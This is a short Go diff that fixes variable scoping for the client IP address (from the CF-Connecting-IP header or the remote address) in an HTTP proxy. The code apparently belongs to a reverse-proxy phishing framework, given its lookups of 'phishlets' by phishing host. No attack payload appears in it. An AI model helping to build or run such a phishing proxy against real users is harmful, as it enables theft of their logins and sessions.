@@ -191,12 +191,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			pl := p.getPhishletByPhishHost(req.Host)
+			remote_addr := ""
 			if req.Header.Get("CF-Connecting-IP") != "" {
-				remote_addr := req.Header.Get("CF-Connecting-IP")
-			}
-			else {
+				remote_addr = req.Header.Get("CF-Connecting-IP")
+			} else {
 				parts := strings.SplitN(req.RemoteAddr, ":", 2)
-				remote_addr := parts[0]
+				remote_addr = parts[0]
 
 			}
 
